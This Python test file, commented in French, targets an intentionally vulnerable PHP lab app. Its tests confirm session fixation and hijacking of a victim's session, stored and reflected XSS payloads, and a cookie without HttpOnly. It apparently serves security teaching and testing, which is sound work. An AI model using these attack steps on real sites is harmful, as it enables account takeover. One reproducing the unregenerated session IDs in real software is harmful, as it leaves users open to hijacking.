"""
Tests sur l'application VULNÉRABLE.
Ces tests doivent PASSER → ils prouvent que l'attaque fonctionne.
"""
import requests

ATTACKER_SID = "ATTACKER_FIXED_SID_TEST_001"


def test_accepts_arbitrary_session_id(base_url, vuln_host):
    r = requests.get(f"{base_url}/login.php",
                     headers=vuln_host,
                     cookies={"PHPSESSID": ATTACKER_SID})
    assert r.status_code == 200
    # l'app vulnérable renvoie le SID dans la page de debug
    assert ATTACKER_SID in r.text, "le SID choisi par l'attaquant doit apparaître côté serveur"


def test_no_regeneration_on_login(base_url, vuln_host):
    """Cœur de la vulnérabilité : aucune régénération du SID après login."""
    s = requests.Session()
    s.headers.update(vuln_host)
    s.cookies.set("PHPSESSID", ATTACKER_SID)

    r = s.post(f"{base_url}/login.php",
               data={"username": "alice", "password": "Password123!"},
               allow_redirects=False)
    assert r.status_code in (302, 303), "login d'Alice doit aboutir"

    # vérifier que le SID dans le cookie jar n'a PAS changé
    assert s.cookies.get("PHPSESSID") == ATTACKER_SID, (
        "Le SID a été régénéré : la vulnérabilité n'est pas exploitable"
    )


def test_attacker_can_hijack_after_victim_login(base_url, vuln_host):
    """
    Scénario complet : Mallory fixe -> Alice se loggue -> Mallory accède au dashboard.
    """
    # 1) Mallory amorce le SID
    requests.get(f"{base_url}/login.php", headers=vuln_host,
                 cookies={"PHPSESSID": ATTACKER_SID})

    # 2) Alice se connecte avec ce SID
    r = requests.post(f"{base_url}/login.php", headers=vuln_host,
                      cookies={"PHPSESSID": ATTACKER_SID},
                      data={"username": "alice", "password": "Password123!"},
                      allow_redirects=False)
    assert r.status_code in (302, 303)

    # 3) Mallory rejoue
    r2 = requests.get(f"{base_url}/dashboard.php", headers=vuln_host,
                      cookies={"PHPSESSID": ATTACKER_SID})
    assert r2.status_code == 200
    assert "Alice" in r2.text, "Mallory voit le tableau de bord d'Alice"


def test_stored_xss_in_comments(base_url, vuln_host):
    """L'app vulnérable ne filtre pas les commentaires."""
    # login mallory pour pouvoir poster
    s = requests.Session()
    s.headers.update(vuln_host)
    s.post(f"{base_url}/login.php",
           data={"username": "mallory", "password": "EvilPass1!"},
           allow_redirects=False)
    payload = '<script id="xss-marker">/*pwn*/</script>'
    s.post(f"{base_url}/comments.php", data={"content": payload})

    r = s.get(f"{base_url}/comments.php")
    assert payload in r.text, "le payload XSS doit être restitué littéralement"


def test_reflected_xss_via_msg_param(base_url, vuln_host):
    payload = '<svg/onload=alert(1)>'
    r = requests.get(f"{base_url}/login.php",
                     headers=vuln_host,
                     params={"msg": payload})
    assert payload in r.text


def test_cookie_not_httponly_on_vulnerable(base_url, vuln_host):
    r = requests.get(f"{base_url}/login.php", headers=vuln_host)
    set_cookie = r.headers.get("Set-Cookie", "")
    assert "HttpOnly" not in set_cookie, "Le cookie ne doit PAS être HttpOnly côté vulnérable"
